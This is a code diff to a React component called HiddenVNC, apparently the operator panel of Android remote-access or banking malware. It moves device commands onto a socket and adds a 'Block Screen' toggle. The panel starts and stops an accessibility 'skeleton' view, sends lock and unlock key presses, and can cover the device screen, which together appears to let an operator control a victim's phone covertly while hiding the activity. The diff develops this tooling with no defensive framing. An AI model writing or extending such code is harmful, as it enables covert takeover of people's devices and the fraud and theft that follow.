@@ -88,12 +88,14 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
   const resizeHandleRef = useRef<HTMLDivElement>(null);
   const lastTriggerRef = useRef<number>(0);
   const hasAutoConnectedRef = useRef<boolean>(false);
+  const [isAutoConnecting, setIsAutoConnecting] = useState(false);
   
   // Control panel state
   const [showArrowKeys, setShowArrowKeys] = useState(false);
   const [textInput, setTextInput] = useState("");
   const [isMuted, setIsMuted] = useState(false);
   const [isLocked, setIsLocked] = useState(false);
+  const [blockScreenEnabled, setBlockScreenEnabled] = useState(false);
   
   // Swipe detection state
   const swipeStartRef = useRef<{ x: number; y: number; time: number } | null>(null);
@@ -132,6 +134,7 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
   useEffect(() => {
     if (isPopupOpen && !isConnected && !hasAutoConnectedRef.current && !isLoading) {
       console.log("🔌 [HiddenVNC] Waiting to check if data is already streaming...");
+      setIsAutoConnecting(true);
       // Wait 3 seconds to see if data is already coming before sending connect command
       const timer = setTimeout(() => {
         // Check again if we're still not connected (data might have arrived in the meantime)
@@ -141,42 +144,24 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
           setIsLoading(true);
           setIsConnected(true);
 
-          // Send start-skeleton command via REST API to device-server
-          const deviceServerUrl = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";
-          
-          console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
-          
-          fetch(`${deviceServerUrl}/api/command/${device.id}`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              cmd: "access-command",
+          // Send start-skeleton command via socket
+          if (socketRef.current && socketRef.current.connected) {
+            console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
+            
+            socketRef.current.emit("send-command", {
+              deviceId: device.id,
+              command: "access-command",
               param: "start-skeleton",
-            }),
-          })
-          .then(response => {
-            if (!response.ok) {
-              return response.json().catch(() => ({})).then(errorData => {
-                console.error("❌ [HiddenVNC] Failed to send command:", errorData);
-                setIsLoading(false);
-                setIsConnected(false);
-              });
-            }
-            return response.json();
-          })
-          .then(data => {
-            if (data) {
-              console.log("✅ [HiddenVNC] Command sent successfully:", data);
-              setIsLoading(false);
-            }
-          })
-          .catch(error => {
-            console.error("❌ [HiddenVNC] Error sending command:", error);
+              payload: {},
+            });
+            
+            console.log("✅ [HiddenVNC] Auto-connect command sent via socket");
+            setIsLoading(false);
+          } else {
+            console.error("❌ [HiddenVNC] Socket not connected for auto-connect");
             setIsLoading(false);
             setIsConnected(false);
-          });
+          }
         } else {
           console.log("🔌 [HiddenVNC] Data already streaming, skipping connect command");
         }
@@ -185,7 +170,10 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
       return () => {
         console.log("🔌 [HiddenVNC] Cleaning up auto-connect timer");
         clearTimeout(timer);
+        setIsAutoConnecting(false);
       };
+    } else if (isConnected || hasAutoConnectedRef.current) {
+      setIsAutoConnecting(false);
     }
   }, [isPopupOpen, isConnected, isLoading, device.id]);
 
@@ -338,7 +326,10 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
       return false;
     });
     setIsConnected(false);
+    setIsLoading(false);
+    setIsAutoConnecting(false);
     setSkeletonData(null);
+    hasAutoConnectedRef.current = false;
     // Navigate back to home page when popup is closed (delay to ensure popup closes first)
     if (onViewSelect) {
       setTimeout(() => {
@@ -425,36 +416,29 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
 
   const handleConnect = async () => {
     console.log("🔌 [HiddenVNC] Connecting...");
+    
+    if (!socketRef.current || !socketRef.current.connected) {
+      console.error("❌ [HiddenVNC] Socket not connected");
+      setIsLoading(false);
+      setIsConnected(false);
+      return;
+    }
+
     setIsLoading(true);
     setIsConnected(true);
 
     try {
-      // Send start-skeleton command via REST API to device-server
-      const deviceServerUrl = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";
-      
+      // Send start-skeleton command via socket
       console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
       
-      const response = await fetch(`${deviceServerUrl}/api/command/${device.id}`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          cmd: "access-command",
-          param: "start-skeleton",
-        }),
+      socketRef.current.emit("send-command", {
+        deviceId: device.id,
+        command: "access-command",
+        param: "start-skeleton",
+        payload: {},
       });
 
-      if (!response.ok) {
-        const errorData = await response.json().catch(() => ({}));
-        console.error("❌ [HiddenVNC] Failed to send command:", errorData);
-        setIsLoading(false);
-        setIsConnected(false);
-        return;
-      }
-
-      const result = await response.json();
-      console.log("✅ [HiddenVNC] start-skeleton command sent:", result);
+      console.log("✅ [HiddenVNC] start-skeleton command sent via socket");
     } catch (error) {
       console.error("❌ [HiddenVNC] Error sending start-skeleton command:", error);
       setIsLoading(false);
@@ -462,18 +446,79 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
     }
   };
 
-  const handleDisconnect = () => {
+  const handleDisconnect = async () => {
     console.log("🔌 [HiddenVNC] Disconnecting...");
+    
+    try {
+      // Send stop-skeleton command via socket
+      if (socketRef.current && socketRef.current.connected) {
+        console.log(`📤 [HiddenVNC] Sending stop-skeleton command to device: ${device.id}`);
+        
+        socketRef.current.emit("send-command", {
+          deviceId: device.id,
+          command: "access-command",
+          param: "stop-skeleton",
+          payload: {},
+        });
+        
+        console.log("✅ [HiddenVNC] stop-skeleton command sent via socket");
+      } else {
+        console.warn("⚠️ [HiddenVNC] Socket not connected, skipping stop-skeleton command");
+      }
+    } catch (error) {
+      console.error("❌ [HiddenVNC] Error sending stop-skeleton command:", error);
+    }
+    
+    // Close popup and clean up
     setIsConnected(false);
-    setSkeletonData(null);
     setIsLoading(false);
+    setIsAutoConnecting(false);
+    setSkeletonData(null);
+    hasAutoConnectedRef.current = false;
+    setIsPopupOpen(false);
+    
+    // Navigate back to home page
+    if (onViewSelect) {
+      setTimeout(() => {
+        onViewSelect(null);
+      }, 100);
+    }
   };
 
-  const handleRefresh = () => {
+  const handleRefresh = async () => {
     console.log("🔄 [HiddenVNC] Refreshing...");
+    
+    if (!socketRef.current || !socketRef.current.connected) {
+      console.error("❌ [HiddenVNC] Socket not connected for refresh");
+      setIsLoading(false);
+      setIsConnected(false);
+      return;
+    }
+    
+    // Reset states first
     setIsLoading(true);
     setSkeletonData(null);
-    handleConnect();
+    
+    // Disconnect first, then reconnect
+    try {
+      // Send stop-skeleton command first via socket
+      socketRef.current.emit("send-command", {
+        deviceId: device.id,
+        command: "access-command",
+        param: "stop-skeleton",
+        payload: {},
+      });
+      
+      // Wait a bit before reconnecting
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      // Now reconnect
+      await handleConnect();
+    } catch (error) {
+      console.error("❌ [HiddenVNC] Error during refresh:", error);
+      setIsLoading(false);
+      setIsConnected(false);
+    }
   };
 
   const sendDeviceCommand = async (command: string, payload: any = {}) => {
@@ -684,6 +729,18 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
       payload: { button: newLockState ? "lock" : "unlock", keycode: KEYCODE_POWER },
     });
   }, [isLocked, device.id, isConnected, sendDeviceCommand]);
+
+  // Block Screen toggle handler
+  const handleBlockScreenToggle = useCallback((checked: boolean) => {
+    setBlockScreenEnabled(checked);
+    const param = checked ? "enable-block-screen|text" : "disable-block-screen|text";
+    console.log(`🚫 [HiddenVNC] ${checked ? 'Enabling' : 'Disabling'} block screen`);
+    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
+    sendDeviceCommand("access-command", {
+      param: param,
+      payload: { blockScreen: checked },
+    });
+  }, [isConnected, device.id, sendDeviceCommand]);
 
   // Convert canvas coordinates to device coordinates
   const canvasToDeviceCoords = useCallback((canvasX: number, canvasY: number) => {
@@ -1273,7 +1330,7 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
     <>
 
       {/* Draggable Popup Window - Rendered via Portal for persistence */}
-      {mounted && isPopupOpen && typeof document !== 'undefined' && createPortal(
+      {mounted && isPopupOpen && typeof document !== 'undefined' && document.body && createPortal(
         <>
           <div
             ref={popupRef}
@@ -1355,9 +1412,11 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
                       <EyeOff className="relative h-12 w-12 mx-auto text-primary/60" />
                     </div>
                     <div className="space-y-1">
-                      <p className="text-sm font-semibold">Ready to Connect</p>
+                      <p className="text-sm font-semibold">
+                        {(isLoading || isAutoConnecting) ? "Wait connecting..." : "Ready to Connect"}
+                      </p>
                       <p className="text-xs text-muted-foreground/70">
-                        Tap Connect to start
+                        {(isLoading || isAutoConnecting) ? "Please wait..." : "Tap Connect to start"}
                       </p>
                     </div>
                   </div>
@@ -1724,6 +1783,19 @@ export default function HiddenVNC({ device, showContent = true, onViewSelect, tr
                         >
                           {isLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
                         </Button>
+                        
+                        <div className="h-px w-full bg-border/50" />
+                        
+                        {/* Block Screen Toggle */}
+                        <div className="px-1 py-1.5 flex flex-col items-center justify-center gap-1">
+                          <Lock className="h-3 w-3 text-muted-foreground" />
+                          <Switch
+                            checked={blockScreenEnabled}
+                            onCheckedChange={handleBlockScreenToggle}
+                            className="scale-75"
+                            title="Block Screen"
+                          />
+                        </div>
                         
                         </>
                       )}
